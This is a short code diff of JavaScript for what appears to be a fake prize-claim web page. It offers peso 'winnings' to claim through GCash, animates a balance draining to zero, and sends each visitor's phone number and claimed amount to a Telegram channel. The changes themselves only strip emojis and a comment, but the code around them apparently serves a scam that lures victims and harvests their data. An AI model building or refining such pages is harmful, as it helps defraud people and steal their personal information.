@@ -21,7 +21,7 @@ function showClaimPopup(amount) {
     prizeSpan.innerHTML = "₱" + amount.toLocaleString();
     
     claimBtn.classList.remove('processing');
-    claimBtn.innerHTML = '💰 CLAIM THRU GCASH 💰';
+    claimBtn.innerHTML = 'CLAIM THRU GCASH';
     claimBtn.disabled = false;
     
     popup.style.display = 'flex';
@@ -48,7 +48,7 @@ function animateBalanceToZero(currentBalance, onComplete) {
     if (!balanceText) return;
     
     let current = currentBalance;
-    const step = Math.max(1, Math.floor(currentBalance / 30)); // ~30 steps
+    const step = Math.max(1, Math.floor(currentBalance / 30));
     const interval = setInterval(() => {
         current = Math.max(0, current - step);
         balanceText.innerText = "₱" + current.toLocaleString() + ".00";
@@ -98,7 +98,7 @@ function onClaimAction() {
     
     // Disable button and change text
     claimBtn.disabled = true;
-    claimBtn.innerHTML = '⏳ PROCESSING...';
+    claimBtn.innerHTML = 'PROCESSING...';
     
     // Send notification to Telegram
     const message = `💰 CLAIM REQUEST (PENDING)!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
